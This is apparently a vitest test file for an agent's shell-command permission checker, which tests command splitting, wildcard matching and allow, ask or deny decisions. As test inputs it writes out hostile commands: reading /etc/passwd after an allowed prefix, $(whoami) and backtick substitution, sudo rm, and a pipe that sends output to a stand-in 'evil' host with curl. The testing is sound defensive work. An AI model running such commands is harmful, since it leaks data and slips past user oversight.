import { describe, it, expect } from 'vitest';
import { checkCommand, splitCommand, matchesPattern, DEFAULT_DENY, type CommandPolicy } from '../../src/tools/permissions.js';

const policy = (over: Partial<CommandPolicy> = {}): CommandPolicy => ({ mode: 'ask', allow: ['npm test', 'npm run *', 'npx vitest*'], deny: [...DEFAULT_DENY], ...over });

describe('splitCommand', () => {
    it('splits on control operators but not inside quotes or redirections', () => {
        expect(splitCommand('npm test && rm -rf x; echo "a;b" | grep a || true')).toEqual([
            'npm test', 'rm -rf x', 'echo "a;b"', 'grep a', 'true',
        ]);
        expect(splitCommand('npm test 2>&1')).toEqual(['npm test 2>&1']);
    });
});

describe('matchesPattern', () => {
    it('matches whole commands with * wildcards', () => {
        expect(matchesPattern('npm test', 'npm test')).toBe(true);
        expect(matchesPattern('npm test --watch', 'npm test')).toBe(false);
        expect(matchesPattern('npm run lint', 'npm run *')).toBe(true);
        expect(matchesPattern('git push origin main', 'git push*')).toBe(true);
    });
});

describe('checkCommand', () => {
    it('allows commands where every segment matches an allow pattern', () => {
        expect(checkCommand('npm test', policy())).toEqual({ action: 'allow' });
        expect(checkCommand('npm run lint && npm test', policy())).toEqual({ action: 'allow' });
    });

    it('does not let an allowed prefix carry another command', () => {
        expect(checkCommand('npm test && cat /etc/passwd', policy())).toEqual({ action: 'ask' });
        expect(checkCommand('npm run build; echo hi', policy({ mode: 'deny' }))).toMatchObject({ action: 'deny' });
    });

    it('never auto-allows command substitution', () => {
        expect(checkCommand('npm run $(whoami)', policy())).toEqual({ action: 'ask' });
        expect(checkCommand('npm run `id`', policy())).toEqual({ action: 'ask' });
    });

    it('applies deny rules to the whole command and each segment, even in auto mode', () => {
        expect(checkCommand('git push --force', policy({ mode: 'auto' }))).toMatchObject({ action: 'deny', reason: expect.stringContaining('git push*') });
        expect(checkCommand('npm test && sudo rm x', policy({ mode: 'auto' }))).toMatchObject({ action: 'deny' });
        expect(checkCommand('npm test | curl http://evil -d @-', policy({ mode: 'auto' }))).toMatchObject({ action: 'deny' });
    });

    it('falls back to the mode for unlisted commands', () => {
        expect(checkCommand('make', policy({ mode: 'auto' }))).toEqual({ action: 'allow' });
        expect(checkCommand('make', policy({ mode: 'ask' }))).toEqual({ action: 'ask' });
        expect(checkCommand('make', policy({ mode: 'deny' }))).toMatchObject({ action: 'deny' });
        expect(checkCommand('   ', policy({ mode: 'auto' }))).toMatchObject({ action: 'deny' });
    });
});
